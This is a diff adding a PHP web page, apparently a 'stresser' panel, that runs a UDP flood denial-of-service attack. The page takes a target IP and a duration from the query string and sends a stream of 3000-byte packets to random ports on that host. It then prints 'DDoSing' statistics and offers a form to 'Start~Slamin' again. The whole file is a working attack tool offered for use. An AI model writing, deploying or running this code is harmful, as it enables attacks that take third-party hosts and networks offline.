@@ -1,0 +1,58 @@
+<?php include("/var/www/html/password_protect.php"); ?>
+<?php
+///////////////////
+//WazabiHD Script//
+//////////////////
+echo "<center> Script Stresser | Web Hosting  </center>";
+if(isset($_GET['host'])&&isset($_GET['time'])){
+$packets = 65500;
+$rand = 53;
+ignore_user_abort(FALSE);
+set_time_limit(300);
+
+$exec_time = $_GET['time'];
+
+$time = time();
+    $max_time = $time+$exec_time;
+
+    $host = $_GET['host'];
+    
+    for($i=1;$i<3000;$i++){
+            $out .= 'X';
+    }
+    while(1){
+    $packets++;
+            if(time() > $max_time){
+                    break;
+            }
+            $rand = rand(1,65535);
+            $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
+            if($fp){
+                    fwrite($fp, $out);
+                    fclose($fp);
+            }
+    }
+$pps = round($packets/$exec_time, 2);
+$megabytes = round(($packets*65)/1024, 2);
+$mbps = round($megabytes/$exec_time, 2);
+$gigabytes = round($megabytes/1024, 2);
+$gbps = round($gigabytes/$exec_time, 2);
+
+echo "DDoSing-->: $host\n <br /> <br />";
+echo "Offline time: $exec_time seconds.\n <br /> <br />";
+echo "Packets:  $packets packets, averaging $pps packets/s.\n <br /> <br />";
+echo "Megabytes: $megabytes MB averaging $mbps MB/s.\n <br /> <br />";
+echo "Gigabytes:  $gigabytes GB averaging  $gbps GB/s.\n <br /> <br />"; 
+
+    echo '<form action="'.$surl.'" method=GET>
+        <input type="hidden" name="act" value="phptools">
+        Skids IP: <br><input type=text name=host><br>
+        Time: <br><input type=text name=time><br><br>
+        <input type=submit value=      Start~Slamin    ></form>';
+}else{ echo '<form action=? method=GET>
+            <input type="hidden" name="act" value="phptools">
+            Skids IP: <br><input type=text name=host value=><br>
+            Time: <br><input type=text name=time value=><br><br>
+            <input type=submit value=      Execute    ></form>';
+}
+?>
